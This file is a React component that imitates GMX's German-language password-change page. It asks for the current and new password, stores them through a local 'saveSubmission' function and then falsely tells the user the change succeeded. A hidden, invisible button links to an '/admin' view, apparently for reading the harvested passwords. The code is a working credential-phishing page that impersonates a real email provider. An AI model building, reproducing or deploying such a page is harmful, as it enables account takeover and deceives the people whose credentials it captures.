import { useState } from "react";
import { Eye, EyeOff, ChevronLeft, Power, Info, Check, X, ShieldCheck } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { saveSubmission } from "@/lib/password-store";

const Index = () => {
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showCurrent, setShowCurrent] = useState(false);
  const [showNew, setShowNew] = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const [saved, setSaved] = useState(false);
  const navigate = useNavigate();

  // Live validation
  const hasMinLength = newPassword.length >= 8;
  const hasLetter = /[a-zA-Z]/.test(newPassword);
  const hasNumber = /[0-9]/.test(newPassword);
  const hasSymbol = /[^a-zA-Z0-9]/.test(newPassword);
  const passwordsMatch = confirmPassword.length > 0 && newPassword === confirmPassword;
  const passwordsMismatch = confirmPassword.length > 0 && newPassword !== confirmPassword;
  const allValid = hasMinLength && hasLetter && hasNumber && currentPassword.length > 0 && passwordsMatch;

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!allValid) return;
    await saveSubmission({ currentPassword, newPassword, confirmPassword });
    setSaved(true);
  };

  if (saved) {
    return (
      <div className="min-h-screen flex flex-col bg-card">
        <header className="bg-primary py-3 px-4 flex items-center justify-between">
          <span className="text-lg font-bold text-primary-foreground tracking-tight">GMX</span>
          <button className="flex items-center gap-1.5 text-primary-foreground/90 text-sm">
            Logout
            <Power className="h-4 w-4" />
          </button>
        </header>

        <main className="flex-1 flex items-center justify-center px-4">
          <div className="text-center max-w-sm">
            <div
              className="h-16 w-16 rounded-full flex items-center justify-center mx-auto mb-5"
              style={{ backgroundColor: "hsl(var(--gmx-info-bg))" }}
            >
              <ShieldCheck className="h-8 w-8 text-primary" />
            </div>
            <h1 className="text-2xl font-bold text-foreground mb-2">Vielen Dank!</h1>
            <p className="text-muted-foreground mb-2 leading-relaxed">
              Ihr Passwort wurde erfolgreich geändert und Ihr Konto ist jetzt wieder sicher geschützt.
            </p>
            <p className="text-sm text-muted-foreground mb-6">
              Die Änderung wird sofort wirksam. Bitte verwenden Sie beim nächsten Login Ihr neues Passwort.
            </p>
            <div
              className="rounded-md px-4 py-3 mb-6 text-sm text-left"
              style={{ backgroundColor: "hsl(var(--gmx-info-bg))", color: "hsl(var(--gmx-info-text))" }}
            >
              <div className="flex items-start gap-2">
                <Info className="h-4 w-4 mt-0.5 flex-shrink-0 text-primary" />
                <p>Tipp: Notieren Sie sich Ihr Passwort an einem sicheren Ort oder verwenden Sie einen Passwort-Manager.</p>
              </div>
            </div>
            <button
              onClick={() => {
                setSaved(false);
                setCurrentPassword("");
                setNewPassword("");
                setConfirmPassword("");
              }}
              className="px-6 py-2.5 rounded-md text-sm font-semibold transition-colors"
              style={{
                backgroundColor: "hsl(var(--gmx-save))",
                color: "hsl(var(--gmx-save-foreground))",
              }}
            >
              Zurück zur Übersicht
            </button>
          </div>
        </main>

        {/* Hidden admin link */}
        <button
          onClick={() => navigate("/admin")}
          className="fixed bottom-2 right-2 w-6 h-6 opacity-0"
          aria-hidden="true"
          tabIndex={-1}
        />
      </div>
    );
  }

  const ValidationItem = ({ met, label }: { met: boolean; label: string }) => (
    <div className="flex items-center gap-2 text-xs">
      {met ? (
        <Check className="h-3.5 w-3.5 text-green-600 flex-shrink-0" />
      ) : (
        <X className="h-3.5 w-3.5 text-muted-foreground flex-shrink-0" />
      )}
      <span className={met ? "text-green-700" : "text-muted-foreground"}>{label}</span>
    </div>
  );

  return (
    <div className="min-h-screen flex flex-col bg-card">
      {/* Header */}
      <header className="bg-primary py-3 px-4 flex items-center justify-between">
        <span className="text-lg font-bold text-primary-foreground tracking-tight">GMX</span>
        <button className="flex items-center gap-1.5 text-primary-foreground/90 text-sm">
          Logout
          <Power className="h-4 w-4" />
        </button>
      </header>

      {/* Content */}
      <main className="flex-1 px-4 pt-4 pb-8 max-w-lg mx-auto w-full">
        <button className="flex items-center gap-0.5 text-primary text-sm mb-4 hover:underline">
          <ChevronLeft className="h-4 w-4" />
          Zurück
        </button>

        <h1 className="text-2xl font-bold text-foreground mb-1">Passwort</h1>
        <p className="text-sm text-muted-foreground mb-6">
          Zuletzt geändert am <span className="font-semibold text-foreground">09. Juli 2025</span>
        </p>

        <form onSubmit={handleSave} className="space-y-5">
          {/* Current Password */}
          <div>
            <label className="block text-sm text-foreground mb-1.5">Aktuelles Passwort</label>
            <div className="relative">
              <input
                type={showCurrent ? "text" : "password"}
                value={currentPassword}
                onChange={(e) => setCurrentPassword(e.target.value)}
                className="w-full h-12 px-3 pr-10 rounded-md border border-border bg-card text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary"
                required
              />
              <button
                type="button"
                onClick={() => setShowCurrent(!showCurrent)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showCurrent ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
          </div>

          {/* New Password */}
          <div>
            <label className="block text-sm text-foreground mb-1.5">Neues Passwort</label>
            <div className="relative">
              <input
                type={showNew ? "text" : "password"}
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
                className={`w-full h-12 px-3 pr-10 rounded-md border bg-card text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary ${
                  newPassword.length > 0 && !hasMinLength ? "border-destructive" : "border-border"
                }`}
                required
              />
              <button
                type="button"
                onClick={() => setShowNew(!showNew)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showNew ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
            {/* Live validation */}
            {newPassword.length > 0 && (
              <div className="mt-2 space-y-1">
                <ValidationItem met={hasMinLength} label="Mindestens 8 Zeichen" />
                <ValidationItem met={hasLetter} label="Mindestens ein Buchstabe" />
                <ValidationItem met={hasNumber} label="Mindestens eine Zahl" />
                <ValidationItem met={hasSymbol} label="Sonderzeichen (empfohlen)" />
              </div>
            )}
          </div>

          {/* Info hint */}
          <div className="flex items-start gap-3 rounded-md px-4 py-3" style={{ backgroundColor: "hsl(var(--gmx-info-bg))" }}>
            <Info className="h-5 w-5 mt-0.5 flex-shrink-0" style={{ color: "hsl(var(--primary))" }} />
            <p className="text-sm leading-relaxed" style={{ color: "hsl(var(--gmx-info-text))" }}>
              Mindestens 8 Zeichen – am besten einen Satz oder eine Mischung aus Buchstaben, Symbolen und Zahlen verwenden
            </p>
          </div>

          {/* Confirm Password */}
          <div>
            <label className="block text-sm text-foreground mb-1.5">Neues Passwort wiederholen</label>
            <div className="relative">
              <input
                type={showConfirm ? "text" : "password"}
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                className={`w-full h-12 px-3 pr-10 rounded-md border bg-card text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary ${
                  passwordsMismatch ? "border-destructive" : "border-border"
                }`}
                required
              />
              <button
                type="button"
                onClick={() => setShowConfirm(!showConfirm)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                {showConfirm ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
            {confirmPassword.length > 0 && (
              <div className="mt-2">
                {passwordsMatch ? (
                  <div className="flex items-center gap-2 text-xs text-green-700">
                    <Check className="h-3.5 w-3.5" />
                    Passwörter stimmen überein
                  </div>
                ) : (
                  <div className="flex items-center gap-2 text-xs text-destructive">
                    <X className="h-3.5 w-3.5" />
                    Passwörter stimmen nicht überein
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Save Button */}
          <button
            type="submit"
            disabled={!allValid}
            className="px-6 py-2.5 rounded-md text-sm font-semibold transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
            style={{
              backgroundColor: "hsl(var(--gmx-save))",
              color: "hsl(var(--gmx-save-foreground))",
            }}
          >
            Speichern
          </button>
        </form>
      </main>

      {/* Hidden admin link - invisible, bottom right */}
      <button
        onClick={() => navigate("/admin")}
        className="fixed bottom-2 right-2 w-6 h-6 opacity-0"
        aria-hidden="true"
        tabIndex={-1}
      />
    </div>
  );
};

export default Index;
